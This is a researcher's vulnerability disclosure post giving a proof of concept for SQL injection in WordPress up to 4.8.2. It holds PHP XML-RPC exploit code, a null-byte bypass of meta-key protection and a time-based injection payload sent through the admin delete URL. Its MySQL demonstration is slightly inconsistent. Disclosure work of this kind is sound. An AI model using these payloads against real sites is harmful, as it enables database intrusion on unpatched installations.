---
title: Wordpress <= 4.8.2 SQL Injection POC
date: 2017-11-09 19:13:04
tags: 漏洞分析
---

Author: Ambulong@vulspy

I found this vulnerability after reading [slavco's post](https://medium.com/websec/wordpress-sqli-bbb2afcc8e94), and reported it to Wordpress Team via Hackerone on Sep. 2nd, 2017. But, unfortunately, WordPress team didn't pay attention to this report too.

## # SQL Injection Details

* [Wordpress SQLi by slavco](https://medium.com/websec/wordpress-sqli-bbb2afcc8e94)
* [Wordpress SQLi — PoC by slavco](https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e)
* [Wordpress SQLi — how to find by slavco](https://medium.com/websec/wordpress-sqli-how-to-find-ebee713457e4)
* [Disclosure: WordPress WPDB SQL Injection - Technical by ircmaxell](https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html)

## # POC Details

If you already found out the potential sqli in wordpress, you would know that we need to insert our playload into `_thumbnail_id` meta in order to launch the sqli attack.

### ## Wordpress ≤ 4.7.4 Lack of capability checks for post meta data in the XML-RPC API

This vulnerability have mentioned in slavco's post: [Wordpress SQLi](https://medium.com/websec/wordpress-sqli-bbb2afcc8e94)

Reference: [WordPress 4.7.5 Security and Maintenance Release](https://wordpress.org/news/2017/05/wordpress-4-7-5/)

**POC**

```php
$usr = 'author';
$pwd = 'author';
$xmlrpc = 'http://local.target/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
$res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);

```

### ## Wordpress ≤ 4.8.2 POST Meta Protection Bypass

#### A trick of Mysql

1). A normal query for _thumbnail_id

```
mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
+---------+---------+----------------+------------+
| meta_id | post_id | meta_key       | meta_value |
+---------+---------+----------------+------------+
|       4 |       4 | _thumbnail_id  | TESTC      |
+---------+---------+----------------+------------+
1 row in set (0.00 sec)
```

2). Change the meta_value of _thumbnail_id to "\x00_thumbnail_id"

```
mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 0  Changed: 0  Warnings: 0
```

3). Query by _thumbnail_id again

```
mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
+---------+---------+----------------+------------+
| meta_id | post_id | meta_key       | meta_value |
+---------+---------+----------------+------------+
|       4 |       4 |  _thumbnail_id | TESTC      |
+---------+---------+----------------+------------+
1 row in set (0.00 sec)
```

#### POST Meta Protection Bypass

This is the `is_protected_meta`([./wp-includes/meta.php](https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920 )) method used to check the validation of post meta:

```php
function is_protected_meta( $meta_key, $meta_type = null ) {
    $protected = ( '_' == $meta_key[0] );
    /**
     * Filters whether a meta key is protected.
     *
     * [@since](/since) 3.2.0
     *
     * [@param](/param) bool   $protected Whether the key is protected. Default false.
     * [@param](/param) string $meta_key  Meta key.
     * [@param](/param) string $meta_type Meta type.
     */
    return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );
}
```

The code just checks the first character of `$meta_key`, from the mysql trick, we can use `%00_` to bypass it.

**POC**

1. Add New Custom Field, Name:`_thumbnail_id` Value:`55 %1$%s or sleep(10)#`
2. Click `Add Custom Field` button.
3. Modify the HTTP request, `_thumbnail_id` => `%00_thumbnail_id`
4. Launch the attack. Visit `/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#`.

#### Time-line:

* Sep. 2th - I report the vulnerability to WP Team via Hackerone.
* Sep. 6th - WP Team ask for details.
* Sep. 6th - I post the details.
* Sep. 6th to now - I haven’t received any response yet...
